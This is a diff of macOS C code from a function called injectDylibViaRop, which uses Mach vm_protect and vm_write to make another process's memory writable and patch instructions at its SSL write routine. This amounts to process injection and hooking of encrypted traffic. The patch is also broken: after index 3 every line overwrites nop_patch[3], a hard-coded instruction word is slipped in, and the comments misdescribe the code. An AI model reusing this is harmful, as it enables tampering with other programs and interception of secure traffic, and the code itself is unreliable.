@@ -593,32 +593,44 @@ void injectDylibViaRop(task_t task, pid_t pid, const char* dylibPath, vm_address
 		}
 
 		// Make writable
-		kr = vm_protect(task, sslWriteAddr, 16, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
+		kr = vm_protect(task, sslWriteAddr, 64, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
 		if (kr != KERN_SUCCESS) {
 			printf("[ERROR] Failed to set memory writable: %s\n", mach_error_string(kr));
 			return;
 		}
 
 		// Patch to: add NOP instructions without breaking the function
-		uint32_t nop_patch[4];
+		uint32_t nop_patch[16];
 
 		// Only replace instructions that are safe to modify
-		nop_patch[0] = original_bytes[0]; // Keep original instruction
-		nop_patch[1] = original_bytes[1];        // NOP instruction
-		nop_patch[2] = original_bytes[2]; // Keep original instruction
-		nop_patch[3] = original_bytes[3];        // NOP instruction
+		nop_patch[0] = original_bytes[0]; 
+		nop_patch[1] = original_bytes[1];      
+		nop_patch[2] = original_bytes[2]; 
+		nop_patch[3] = original_bytes[3]; 
+		nop_patch[3] = original_bytes[4]; 
+		nop_patch[3] = original_bytes[5]; 
+		nop_patch[3] = 0xAA1303F3; 
+		nop_patch[3] = original_bytes[7]; 
+		nop_patch[3] = original_bytes[8]; 
+		nop_patch[3] = original_bytes[9]; 
+		nop_patch[3] = original_bytes[10]; 
+		nop_patch[3] = original_bytes[11]; 
+		nop_patch[3] = original_bytes[12]; 
+		nop_patch[3] = original_bytes[13]; 
+		nop_patch[3] = original_bytes[14]; 
+		nop_patch[3] = original_bytes[15];        
 
-		kr = vm_write(task, sslWriteAddr, (vm_offset_t)nop_patch, 16);
+		kr = vm_write(task, sslWriteAddr, (vm_offset_t)nop_patch, 64);
 		if (kr != KERN_SUCCESS) {
 			printf("[ERROR] Failed to write NOP patch: %s\n", mach_error_string(kr));
 
 			// Restore original bytes if patch fails
-			vm_write(task, sslWriteAddr, (vm_offset_t)original_bytes, 16);
+			vm_write(task, sslWriteAddr, (vm_offset_t)original_bytes, 64);
 			return;
 		}
 
 		// Restore executable
-		kr = vm_protect(task, sslWriteAddr, 16, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+		kr = vm_protect(task, sslWriteAddr, 64, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
 		if (kr != KERN_SUCCESS) {
 			printf("[ERROR] Failed to restore memory protection: %s\n", mach_error_string(kr));
 			return;
